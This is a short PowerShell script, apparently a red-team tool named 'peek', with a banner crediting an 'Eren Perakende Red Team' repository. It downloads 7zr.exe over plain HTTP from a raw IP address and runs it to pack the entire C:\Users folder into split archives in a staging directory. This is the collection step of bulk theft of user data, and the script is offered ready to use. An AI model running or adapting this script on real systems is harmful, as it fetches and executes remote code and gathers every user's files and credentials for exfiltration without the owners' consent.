Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
╔══════════════════════════════════════════════════════════════════╗
║                             █████                           ████ ║
║                            ░░███                           ░░███ ║
║ ████████   ██████   ██████  ░███ █████    ████████   █████  ░███ ║
║░░███░░███ ███░░███ ███░░███ ░███░░███    ░░███░░███ ███░░   ░███ ║
║ ░███ ░███░███████ ░███████  ░██████░      ░███ ░███░░█████  ░███ ║
║ ░███ ░███░███░░░  ░███░░░   ░███░░███     ░███ ░███ ░░░░███ ░███ ║
║ ░███████ ░░██████ ░░██████  ████ █████ ██ ░███████  ██████  █████║
║ ░███░░░   ░░░░░░   ░░░░░░  ░░░░ ░░░░░ ░░  ░███░░░  ░░░░░░  ░░░░░ ║
║ ░███                                      ░███                   ║
║ █████                                     █████                  ║
║░░░░░                                     ░░░░░                   ║
╚══════════════════════════════════════════════════════════════════╝
" 

Write-Host -Fore Red "          Eren Perakende Red Team"  
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""


$outputArchive = "C:\eren\peek\UsersBackup.7z"
$sourceFolder = "C:\Users"

if (-not (Test-Path "C:\eren")) {
    New-Item -Path "C:\eren" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\peek")) {
    New-Item -Path "C:\eren\peek" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\7zr.exe")) {
    Start-BitsTransfer -Source "http://78.129.240.79:8080/7zr.exe" -Destination "C:\eren\7zr.exe"
}

Start-Process -FilePath "C:\eren\7zr.exe" -ArgumentList "a", "`"$outputArchive`"", "`"$sourceFolder`"", "-v2g", "-mx9", "-y" -Wait
